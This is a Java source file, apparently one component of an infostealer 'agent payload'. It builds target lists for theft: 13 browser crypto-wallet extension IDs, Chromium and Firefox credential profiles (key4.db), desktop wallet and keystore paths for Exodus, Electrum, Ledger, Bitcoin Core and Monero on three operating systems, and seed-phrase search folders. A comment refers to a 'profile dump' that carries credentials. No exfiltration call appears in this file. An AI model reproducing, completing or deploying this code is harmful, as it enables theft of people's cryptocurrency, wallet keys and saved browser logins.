package com.spcagentpayloa.jvmxx.crypto;

import com.spcagentpayloa.jvmxx.AgentPaths;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * Per-OS source paths. Only existing paths are returned, and every path is
 * plain ASCII after the user root. LevelDB is copied to a temp dir by the
 * caller so Chrome's LOCK file cannot truncate a live store.
 */
final class CryptoPaths {
	static final Map<String, String> EXTENSIONS = new LinkedHashMap<>();

	static {
		EXTENSIONS.put("metamask", "nkbihfbeogaeaoehlefnkodbefgpgknn");
		EXTENSIONS.put("phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa");
		EXTENSIONS.put("rabby", "acmacodkjbdgmoleebolmdjonilkdbch");
		EXTENSIONS.put("keplr", "dmkamcknogkgcdfhhbddcghachkejeap");
		EXTENSIONS.put("coinbase", "hnfanknocfeofbddgcijnmhnfnkdnaad");
		EXTENSIONS.put("solflare", "bhhhlbepdkbapadjdnnojkbgioiodbic");
		EXTENSIONS.put("tronlink", "ibnejdfjmmkpcnlpebklmnkoeoihofec");
		EXTENSIONS.put("trust", "egjidjbpglichdcondbcbdnbeeppgdph");
		EXTENSIONS.put("binance", "fhbohimaelbohpjbbldcngcnapndodjp");
		EXTENSIONS.put("yoroi", "ffnbelfdoeiohenkjibnmadjiehjhajb");
		EXTENSIONS.put("nami", "lpfcbjknijpeeillifnkikgncikgfhdo");
		EXTENSIONS.put("xdefi", "hmeobnfnfcmdkdcmlblgagmfpfboieaf");
		EXTENSIONS.put("backpack", "aflkmfhebedbjioipglgcbcmnbpgliof");
	}

	record Target(String id, String kind, Path path, boolean extension) {
	}

	private CryptoPaths() {
	}

	static String os() {
		if (AgentPaths.isWindows()) {
			return "windows";
		}
		if (AgentPaths.isMac()) {
			return "macos";
		}
		return "linux";
	}

	static List<Path> browserRoots() {
		List<Path> roots = new ArrayList<>();
		String home = System.getProperty("user.home", ".");
		if (AgentPaths.isWindows()) {
			String local = System.getenv("LOCALAPPDATA");
			String roaming = System.getenv("APPDATA");
			if (local != null) {
				roots.add(Path.of(local, "Google", "Chrome", "User Data"));
				roots.add(Path.of(local, "Microsoft", "Edge", "User Data"));
				roots.add(Path.of(local, "BraveSoftware", "Brave-Browser", "User Data"));
			}
			if (roaming != null) {
				roots.add(Path.of(roaming, "Opera Software", "Opera Stable"));
			}
		} else if (AgentPaths.isMac()) {
			Path support = Path.of(home, "Library", "Application Support");
			roots.add(support.resolve("Google").resolve("Chrome"));
			roots.add(support.resolve("Microsoft Edge"));
			roots.add(support.resolve("BraveSoftware").resolve("Brave-Browser"));
			roots.add(support.resolve("com.operasoftware.Opera"));
		} else {
			Path config = Path.of(home, ".config");
			roots.add(config.resolve("google-chrome"));
			roots.add(config.resolve("microsoft-edge"));
			roots.add(config.resolve("BraveSoftware").resolve("Brave-Browser"));
			roots.add(config.resolve("opera"));
		}
		return roots.stream().filter(Files::isDirectory).toList();
	}

	static List<Path> profiles(Path root) {
		List<Path> profiles = new ArrayList<>();
		try (var stream = Files.list(root)) {
			for (Path candidate : stream.filter(Files::isDirectory).toList()) {
				String name = candidate.getFileName().toString();
				if (name.equals("Default") || name.startsWith("Profile ") || name.equals("Opera Stable")) {
					profiles.add(candidate);
				}
			}
		} catch (Throwable ignored) {
			// unreadable profile
		}
		if (profiles.isEmpty()) {
			profiles.add(root);
		}
		return profiles;
	}

	static List<Target> extensionTargets(boolean includeIndexedDb) {
		List<Target> targets = new ArrayList<>();
		for (Path root : browserRoots()) {
			String browser = browserName(root);
			for (Path profile : profiles(root)) {
				for (Map.Entry<String, String> entry : EXTENSIONS.entrySet()) {
					String id = entry.getValue();
					Path settings = profile.resolve("Local Extension Settings").resolve(id);
					if (Files.isDirectory(settings)) {
						targets.add(new Target(entry.getKey(), "extension", settings, true));
					}
					Path sync = profile.resolve("Sync Extension Settings").resolve(id);
					if (Files.isDirectory(sync)) {
						targets.add(new Target(entry.getKey() + "-sync", "extension", sync, true));
					}
					if (includeIndexedDb) {
						Path indexed = profile.resolve("IndexedDB").resolve("chrome-extension_" + id + "_0.indexeddb.leveldb");
						if (Files.isDirectory(indexed)) {
							targets.add(new Target(entry.getKey() + "-idb", "extension", indexed, true));
						}
					}
				}
				// Mark the browser root once so credentials travel with the profile dump.
				targets.add(new Target("profile-" + browser, "creds", profile, true));
			}
		}
		return dedupe(targets);
	}

	static List<Path> firefoxRoots() {
		String home = System.getProperty("user.home", ".");
		List<Path> roots = new ArrayList<>();
		if (AgentPaths.isWindows()) {
			String roaming = System.getenv("APPDATA");
			if (roaming != null) {
				roots.add(Path.of(roaming, "Mozilla", "Firefox", "Profiles"));
			}
		} else if (AgentPaths.isMac()) {
			roots.add(Path.of(home, "Library", "Application Support", "Firefox", "Profiles"));
		} else {
			roots.add(Path.of(home, ".mozilla", "firefox"));
		}
		return roots.stream().filter(Files::isDirectory).toList();
	}

	/** Chromium profiles plus Firefox profiles that actually carry key4.db. */
	static List<Path> credentialProfiles() {
		List<Path> out = new ArrayList<>();
		for (Path root : browserRoots()) {
			out.addAll(profiles(root));
		}
		for (Path root : firefoxRoots()) {
			try (var stream = Files.list(root)) {
				for (Path profile : stream.filter(Files::isDirectory).toList()) {
					if (Files.isRegularFile(profile.resolve("key4.db"))) {
						out.add(profile);
					}
				}
			} catch (Throwable ignored) {
				// no profile
			}
		}
		return out;
	}

	static List<Target> desktopTargets() {
		List<Target> targets = new ArrayList<>();
		String home = System.getProperty("user.home", ".");
		String roaming = System.getenv("APPDATA");
		String local = System.getenv("LOCALAPPDATA");
		if (AgentPaths.isWindows()) {
			if (roaming != null) {
				targets.add(new Target("exodus", "desktop", Path.of(roaming, "Exodus", "exodus.wallet"), false));
				targets.add(new Target("electrum", "desktop", Path.of(roaming, "Electrum", "wallets"), false));
				targets.add(new Target("atomic", "desktop", Path.of(roaming, "Atomic", "Local Storage", "leveldb"), false));
				targets.add(new Target("trust", "desktop", Path.of(roaming, "Trust Wallet", "Local Storage", "leveldb"), false));
				targets.add(new Target("coinomi", "desktop", Path.of(roaming, "Coinomi", "Coinomi", "wallets"), false));
				targets.add(new Target("ledger", "desktop", Path.of(roaming, "Ledger Live"), false));
			}
			if (local != null) {
				targets.add(new Target("atomic", "desktop", Path.of(local, "Programs", "atomic", "resources", "app", "Local Storage", "leveldb"), false));
				targets.add(new Target("trust", "desktop", Path.of(local, "Trust Wallet", "Local Storage", "leveldb"), false));
				targets.add(new Target("ledger", "desktop", Path.of(local, "Ledger Live"), false));
				targets.add(new Target("geth", "keystore", Path.of(roaming, "Ethereum", "keystore"), false));
				targets.add(new Target("parity", "keystore", Path.of(roaming, "Parity", "Ethereum", "keys"), false));
				targets.add(new Target("bitcoin-core", "core", Path.of(roaming, "Bitcoin", "wallets"), false));
				targets.add(new Target("monero", "core", Path.of(roaming, "Monero", "wallets"), false));
				targets.add(new Target("electrum-ltc", "desktop", Path.of(roaming, "Electrum-LTC", "wallets"), false));
			}
		} else if (AgentPaths.isMac()) {
			Path support = Path.of(home, "Library", "Application Support");
			targets.add(new Target("exodus", "desktop", support.resolve("Exodus").resolve("exodus.wallet"), false));
			targets.add(new Target("electrum", "desktop", support.resolve("Electrum").resolve("wallets"), false));
			targets.add(new Target("atomic", "desktop", support.resolve("Atomic").resolve("Local Storage").resolve("leveldb"), false));
			targets.add(new Target("trust", "desktop", support.resolve("Trust Wallet").resolve("Local Storage").resolve("leveldb"), false));
			targets.add(new Target("coinomi", "desktop", support.resolve("Coinomi").resolve("Coinomi").resolve("wallets"), false));
			targets.add(new Target("ledger", "desktop", support.resolve("Ledger Live"), false));
			targets.add(new Target("geth", "keystore", support.resolve("Ethereum").resolve("keystore"), false));
			targets.add(new Target("bitcoin-core", "core", support.resolve("Bitcoin").resolve("wallets"), false));
			targets.add(new Target("monero", "core", support.resolve("Monero").resolve("wallets"), false));
		} else {
			Path config = Path.of(home, ".config");
			targets.add(new Target("exodus", "desktop", config.resolve("Exodus").resolve("exodus.wallet"), false));
			targets.add(new Target("electrum", "desktop", Path.of(home, ".electrum").resolve("wallets"), false));
			targets.add(new Target("atomic", "desktop", config.resolve("Atomic").resolve("Local Storage").resolve("leveldb"), false));
			targets.add(new Target("trust", "desktop", config.resolve("Trust Wallet").resolve("Local Storage").resolve("leveldb"), false));
			targets.add(new Target("coinomi", "desktop", config.resolve("Coinomi").resolve("Coinomi").resolve("wallets"), false));
			targets.add(new Target("ledger", "desktop", config.resolve("Ledger Live"), false));
			targets.add(new Target("geth", "keystore", Path.of(home, ".ethereum").resolve("keystore"), false));
			targets.add(new Target("bitcoin-core", "core", Path.of(home, ".bitcoin").resolve("wallets"), false));
			targets.add(new Target("monero", "core", Path.of(home, ".bitmonero"), false));
			targets.add(new Target("electrum-ltc", "desktop", Path.of(home, ".electrum-ltc").resolve("wallets"), false));
		}
		return dedupe(targets);
	}

	static List<Path> seedDirs() {
		String home = System.getProperty("user.home", ".");
		String roaming = System.getenv("APPDATA");
		List<Path> dirs = new ArrayList<>();
		dirs.add(Path.of(home, "Desktop"));
		dirs.add(Path.of(home, "Documents"));
		dirs.add(Path.of(home, "Downloads"));
		if (roaming != null) {
			dirs.add(Path.of(roaming));
		}
		if (AgentPaths.isMac()) {
			dirs.add(Path.of(home, "Library", "Application Support"));
		} else if (!AgentPaths.isWindows()) {
			dirs.add(Path.of(home, ".config"));
		}
		return dirs.stream().filter(Files::isDirectory).toList();
	}

	static Path browserState(Path profile) {
		// profile -> User Data (two levels up for Default/Profile N).
		Path parent = profile.getParent();
		return parent == null ? null : parent.resolve("Local State");
	}

	private static String browserName(Path root) {
		String value = root.toString().toLowerCase();
		if (value.contains("edge")) {
			return "edge";
		}
		if (value.contains("brave")) {
			return "brave";
		}
		if (value.contains("opera")) {
			return "opera";
		}
		return "chrome";
	}

	private static List<Target> dedupe(List<Target> values) {
		Map<String, Target> unique = new LinkedHashMap<>();
		for (Target target : values) {
			if (target.path() != null && Files.exists(target.path())) {
				unique.putIfAbsent(target.id() + "|" + target.path(), target);
			}
		}
		return new ArrayList<>(unique.values());
	}
}
